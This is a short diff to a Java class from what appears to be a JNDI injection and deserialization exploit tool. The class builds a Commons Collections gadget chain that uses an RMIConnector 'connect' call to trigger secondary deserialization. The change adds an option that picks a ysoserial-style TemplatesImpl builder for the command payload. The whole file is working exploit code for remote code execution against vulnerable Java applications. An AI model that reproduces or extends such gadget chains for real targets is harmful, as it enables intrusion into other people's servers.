@@ -2,6 +2,7 @@ package com.qi4l.jndi.gadgets;
 
 import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
@@ -10,6 +11,8 @@ import org.apache.commons.collections.map.LazyMap;
 
 import java.util.HashMap;
 import java.util.Map;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
  * RMIConnector 二次反序列化
@@ -20,7 +23,12 @@ public class CommonsCollections11 implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
-        Object                  templates          = Gadgets.createTemplatesImpl(type, param);
+        final Object templates;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            templates = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            templates = Gadgets.createTemplatesImpl(type, param);
+        }
         InvokerTransformer      invokerTransformer = new InvokerTransformer("connect", null, null);
         HashMap<Object, Object> map                = new HashMap<>();
         Map<Object, Object>     lazyMap            = LazyMap.decorate(map, new ConstantTransformer(1));
